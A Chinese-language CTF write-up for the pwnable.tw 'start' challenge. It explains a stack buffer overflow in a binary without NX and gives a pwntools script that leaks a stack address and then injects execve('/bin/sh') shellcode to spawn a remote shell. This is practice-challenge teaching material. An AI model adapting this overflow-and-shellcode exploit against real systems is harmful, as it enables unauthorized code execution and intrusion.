0x01 思路

这个程序使用内联汇编写的，通过int 0x80来控制程序执行

程序刚开始调用了write读入了0x14个字节，然后调用read读取0x3c个字节，而栈只有0x14大小，这里存在栈溢出漏洞可以利用

程序没有开启NX保护，可以写入shellcode来进行getshell

首先需要泄露栈地址,程序在retn回exit函数之前，执行了add esp,14h，这使得栈回到了上一个栈帧

然后再次利用栈溢出将shellcode放入栈中，并且将返回地址放入shellcode的地址即可getshell

from pwn import *

#io = process('./start')
io = remote('chall.pwnable.tw',10000)

context.log_level = 'debug'
context.arch = 'i386'
context.os = 'linux'

offset = 0x14
stack_addr = 0x8048087

payload = 'A' * offset
payload += p32(stack_addr)

io.sendafter("Let's start the CTF:",payload)

stack_addr = u32(io.recv(4))

shellcode ='''
xor ecx,ecx
xor edx,edx
xor eax,eax
mov al,11
xor ebx,ebx
mov ebx,esp
int 0x80
'''

payload = 'A' * offset
payload += p32(stack_addr+0x14+0x8) # 0x14 * 'A' 0x14个字节 + '/bin/sh\x00' 8个字节= 0x1c
payload += '/bin/sh\x00'
payload += asm(shellcode)

io.send(payload)

io.interactive()
